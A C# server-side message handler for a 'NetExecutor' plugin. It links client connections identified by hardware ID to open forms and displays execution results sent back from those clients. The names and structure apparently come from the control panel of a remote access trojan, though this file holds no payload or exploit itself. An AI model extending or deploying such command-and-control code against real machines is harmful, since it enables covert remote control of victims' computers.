using System;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

public class HandlerNetExecutor
{
	public static void Read(Clients client, object[] array)
	{
		if (client == null || array == null || array.Length < 1)
		{
			client?.Disconnect();
			return;
		}
		try
		{
			string command = array[0] as string;
			if (string.IsNullOrEmpty(command))
			{
				client.Disconnect();
			}
			else if (command == "NetExecutorPlugin")
			{
				if (array.Length < 3)
				{
					client.Disconnect();
				}
				else
				{
					if (!(array[1] as string == "Connect"))
					{
						return;
					}
					string hwid = array[2] as string;
					if (string.IsNullOrEmpty(hwid))
					{
						client.Disconnect();
						return;
					}
					FormNetExecutor form = (FormNetExecutor)Application.OpenForms["NetExecutor:" + hwid];
					if (form != null)
					{
						client.Tag = form;
						form.client = client;
						form.BeginInvoke((MethodInvoker)delegate
						{
							form.richTextBoxOutput.AppendText("[" + DateTime.Now.ToLongTimeString() + "] NetExecutor Plugin connected! Ready to execute.\n");
						});
					}
					else
					{
						client.Disconnect();
					}
				}
			}
			else
			{
				if (!(command == "NetExecutorResult"))
				{
					return;
				}
				if (array.Length < 3)
				{
					client.Disconnect();
					return;
				}
				string hwid2 = array[1] as string;
				string result = array[2] as string;
				if (string.IsNullOrEmpty(hwid2))
				{
					client.Disconnect();
					return;
				}
				FormNetExecutor formNetExecutor = (FormNetExecutor)Application.OpenForms["NetExecutor:" + hwid2];
				if (formNetExecutor != null)
				{
					formNetExecutor.BeginInvoke((MethodInvoker)delegate
					{
						formNetExecutor.richTextBoxOutput.AppendText("[" + DateTime.Now.ToLongTimeString() + "] Result received:\n" + result + "\n");
						formNetExecutor.richTextBoxOutput.ScrollToCaret();
					});
				}
			}
		}
		catch (Exception ex)
		{
			Methods.AppendLogs("NetExecutor Handler Error", ex.Message, Color.Red);
		}
	}
}
